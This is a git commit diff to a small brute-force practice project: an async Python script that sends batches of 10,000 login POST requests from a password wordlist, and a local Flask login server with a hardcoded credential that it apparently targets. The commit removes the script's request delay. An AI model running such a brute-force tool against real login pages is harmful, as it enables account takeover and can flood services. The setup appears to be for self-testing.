923c7270a2fb2fe0a80597bfd950bd55770ca9b0
Jorge <jglez1616@gmail.com>
2021-10-27 14:50:00 -0500

    end

--- bruteforce.py
+++ bruteforce.py
@@ -1,5 +1,3 @@
-from os import system
-import requests
 import asyncio
 import httpx
 import datetime
@@ -7,37 +5,32 @@ from timeit import default_timer as timer
 from sys import exit
 import time
 
-# TODO: change requests to asyncio to perform multiple requests at the same time.
-# TODO: Import PASSWORDS from a file.
-
 # 1020318
-PASSWORDS = [item.replace("\n", "") for item in open('easy.txt', 'r', encoding='utf8').readlines()]
+PASSWORDS = [item.replace("\n", "") for item in open('passwords.txt', 'r', encoding='utf8').readlines()]
 TOTAL_PASSWORDS = len(PASSWORDS)
-PASSWORDS = [PASSWORDS[x:x+10] for x in range(0, TOTAL_PASSWORDS, 10)]
+PASSWORDS = [PASSWORDS[x:x+10000] for x in range(0, TOTAL_PASSWORDS, 10000)]
 
 start = timer()
-
 async def do_request(url, user, username_field, password_field):
+    tmplist = []
     for passwords in PASSWORDS: # passwords = chunk of 10 passwords.
+        tmplist = passwords
         async with httpx.AsyncClient() as client:
             tasks = (client.post(url, data={username_field: user, password_field: password}) for password in passwords)
             reqs = await asyncio.gather(*tasks)
-
-        time.sleep(0.1)
 
         results = [req for req in reqs]
         for id, result in enumerate(results):
             if result.status_code == 200 or result.status_code == 302:
                 print('USER FOUND!!!!!!')
-                print(result._request.body)
+                print(user, tmplist[id])
                 end = timer()
+                print("Ended bruteforce...", datetime.datetime.now())
                 print('Total time', end-start)
                 exit()
-                break
     
     end = timer() 
     print('password not found...', end-start)
-
 
 def do_users(url, username_field, password_field):
     asyncio.run(do_request(url, 'jorge_gonzalez', username_field, password_field))
--- server.py
+++ server.py
@@ -1,10 +1,13 @@
 from flask import Flask, request, session, render_template
 from flask_session import Session
+
 from werkzeug.exceptions import BadRequest
 from werkzeug.utils import redirect
+import logging
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
-
 
 app.config["SESSION_PERMANENT"] = False
 app.config["SESSION_TYPE"] = "redis"
@@ -17,12 +20,17 @@ def handle_bad_request(e):
     return 'bad request!', 400
 
 # Route called '/login/' with POST method, checks if the username and password are correct
+total_passwords = 0
+
 @app.route('/login', methods=['POST'])
 def login():
+    global total_passwords
     username = request.form['username']
     password = request.form['password']
+    total_passwords+=1
 
-    print(username, password)
+    if total_passwords%1000 == 0:
+        print(total_passwords, username, password)
 
     if username == 'jorge_gonzalez' and password == '&!pass542':
         session["username"] = request.form.get("username")
